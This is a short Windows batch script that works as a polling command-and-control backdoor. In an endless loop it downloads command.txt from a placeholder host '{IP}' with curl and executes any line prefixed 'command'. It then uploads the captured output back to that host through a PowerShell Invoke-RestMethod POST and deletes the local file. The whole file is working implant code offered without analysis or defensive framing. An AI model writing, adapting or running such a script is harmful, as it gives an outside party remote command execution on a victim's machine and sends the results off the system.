@echo off
setlocal enabledelayedexpansion

rem Customcommand sends custom command to be execute
:customCommand

for /f "delims=" %%i in ('curl http://{IP}/command.txt') do (
    set "fileContent=%%i"
    echo !fileContent!
)

echo %fileContent:~0,7%
if "%fileContent:~0,7%" == "command" (
    echo CUSTOM COMMAND
    echo "%fileContent:~8%"
    %fileContent:~8%
    %fileContent:~8% > output.txt
    
    rem Upload output file
    powershell -command "Invoke-RestMethod -Uri 'http://{IP}/output.txt' -Method Post -InFile '%cd%\output.txt' -ContentType 'multipart/form-data'"
    
    del output.txt

)
timeout /t 10
cls

endlocal

goto customCommand